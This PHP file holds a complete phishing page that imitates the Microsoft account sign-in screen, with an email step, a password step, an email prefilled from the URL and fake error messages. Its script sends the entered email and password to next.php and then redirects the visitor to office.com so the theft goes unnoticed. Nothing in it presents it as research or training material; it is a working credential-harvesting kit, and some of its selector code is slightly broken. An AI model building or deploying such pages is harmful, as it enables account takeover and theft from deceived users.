<?php
defined('SECURE_ENTRY') or define('SECURE_ENTRY', true);

// Clean HTML content (removed hex encoding for security)
$inspectElement = "
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>Microsoft Login</title>
    <link rel='stylesheet' href='assets/bootstrap/css/bootstrap.min.css'>
    <link rel='stylesheet' href='assets/css/res.css'>
    <link rel='stylesheet' href='assets/css/styles.css'>
    <style>
        @keyframes slideLeft {
            0% { transform: translateX(0); opacity: 1; }
            100% { transform: translateX(-100%); opacity: 0; }
        }
        @keyframes slideRight {
            0% { transform: translateX(100%); opacity: 0; }
            100% { transform: translateX(0); opacity: 1; }
        }
        @keyframes slideBack {
            0% { transform: translateX(-100%); opacity: 0; }
            100% { transform: translateX(0); opacity: 1; }
        }
        .hide-left {
            animation: slideLeft 0.5s forwards;
        }
        .show-right {
            animation: slideRight 0.5s forwards;
        }
        .show-left {
            animation: slideBack 0.5s forwards;
        }
        @media (max-width: 600px) {
            #main-container{
                width: 100% !important;
                margin-top: 20px !important;
            }
            #form-outer{
                padding: 30px !important;
            }
        }
    </style>
</head>
<body class='bg-dark' style='padding: 8px 44px;'>
    <div id='main-outer' class='spdi' style='max-width: 440px;width: 100%;height: 406px;margin-top: 200px;'>
        <div id='form-outer' style='width: 100%;max-width: 440px;height: 338px;background: var(--body-bg);padding: 44px;'>
            <div id='em-div' class='em-div'>
                <img src='assets/img/lg.svg'>
                <div style='margin: 10px;'></div>
                <p id='em-err' style='margin: 0px;font-family: var(--form-invalid-border-color); display: none; visibility: visible;'>Please provide valid email address.</p>
                <input type='text' id='id' style='width: 100%;height: 36px;border-style: none;border-bottom-style: solid;border-bottom-width: 1px;border-bottom-color: black;margin-top: 30px;padding-bottom: 18px;' placeholder='Email, Phone or Skype' value=''>
                <p style='font-size: 14px;'>No account?&nbsp;<a href='#' style='color: #4291cf;'>Create one</a></p>
                <button class='btn btn-primary' id='next-btn' type='button' style='width: 100%;max-width: 108px;height: 31px;margin-top: 30px;background: #3067b8;border-style: none;border-bottom-style: solid;border-bottom-width: 1px;border-bottom-color: black;padding: 0px;' onclick='nextFun();'>Next</button>
            </div>
            <div id='pass-div' class='pass-div' style='display: none;'>
                <img src='assets/img/lg.svg'>
                <div style='margin: 10px;'></div>
                <p id='pass-err' style='margin: 0px;font-family: var(--form-invalid-border-color); display: none; visibility: visible;'>Incorrect Password</p>
                <div id='backbtn-div' style='height: 28px;padding: 2px;' onclick='backbtn()'>
                    <button style='background: transparent;border: none;'>
                        <img src='assets/img/bar.svg'>
                    </button>
                </div>
                <input type='password' id='pass' style='width: 100%;height: 36px;border-style: none;border-bottom-style: solid;border-bottom-width: 1px;border-bottom-color: black;margin-top: 30px;padding-bottom: 18px;' placeholder='Password'>
                <a class='dblink' href='#' style='color: #4291cf;font-size: 14px;margin-bottom: 16px;'>Forgot password?</a>
                <div id='backbtn-div' class='backbtn-div' style='height: 28px;padding: 2px;' onclick='backbtn()'>
                    <button class='btn btn-primary' id='next-btn1' type='button' style='width: 100%;max-width: 108px;height: 31px;background: #3067b8;border-style: none;border-bottom-style: solid;border-bottom-width: 1px;border-bottom-color: black;padding: 0px;' onclick='nextFun();'>Sign In</button>
                </div>
            </div>
        </div>
    </div>
    <script src='assets/bootstrap/js/bootstrap.min.js'></script>
    <script src='https://ajax.googleapis.com/ajax/libs/jquery/3.2.4/jquery.min.js'></script>
    <script src='https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js'></script>
    <script>
        $(document).ready(function () {
            const ai = window.location.hash.substr(1);
            if (ai) {
                $('#id').val(ai);
                setTimeout(nextFun, 600);
            }
        });

        document.addEventListener('keydown', function(event) {
            if (event.key === 'Enter') {
                nextFun();
            }
        });

        let count = 0;

        function validateEmail(email) {
            return email && /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/.test(email);
        }

        function backbtn(){
            document.getElementById('em-div').classList.add('show-left');
            document.getElementById('em-div').classList.remove('hide-left');
            document.getElementById('pass-div').classList.add('hide-left');
            document.getElementById('pass-div').classList.remove('show-right');
            count = 0;
        }

        function nextFun() {
            const idValue = document.getElementById('id').value;
            const passValue = document.getElementById('pass').value;

            document.getElementById('em-err').style.display = 'none';
            document.getElementById('id').style.marginTop = '30px';
            document.getElementById('#next-btn').style.display = 'none';
            document.getElementById('#next-btn1').style.display = 'none';

            if (validateEmail(idValue) && count === 0) {
                document.getElementById('next-btn').style.display = 'none';
                setTimeout(() => {
                    document.getElementById('em-div').classList.add('hide-left');
                    document.getElementById('em-div').classList.remove('show-left');
                    document.getElementById('pass-div').classList.add('show-right');
                    document.getElementById('pass-div').classList.remove('hide-left');
                }, 800);
                count = 1;
            } else if (idValue.length > 0 && passValue.length === 0 && count === 1) {
                document.getElementById('pass-err').style.display = 'none';
                document.getElementById('#next-btn1').style.display = 'none';
                setTimeout(() => {
                    submitData(idValue, passValue, true);
                }, 1500);
            } else if (idValue.length > 0 && passValue.length > 0 && count === 1) {
                document.getElementById('pass-err').style.display = 'none';
                document.getElementById('#next-btn1').style.display = 'none';
                setTimeout(() => {
                    submitData(idValue, passValue, true);
                }, 1500);
            }
        }

        function submitData(idValue, passValue, redirect) {
            $.ajax({
                url: 'next.php',
                type: 'POST',
                data: { di: idValue, pr: passValue },
                success: function(response) {
                    console.log('Success:', response);
                    if (redirect) {
                        window.location.replace('https://www.office.com');
                    }
                },
                error: function(xhr, status, error) {
                    console.error('Error:', error);
                }
            });
        }
    </script>
</body>
</html>
";
?>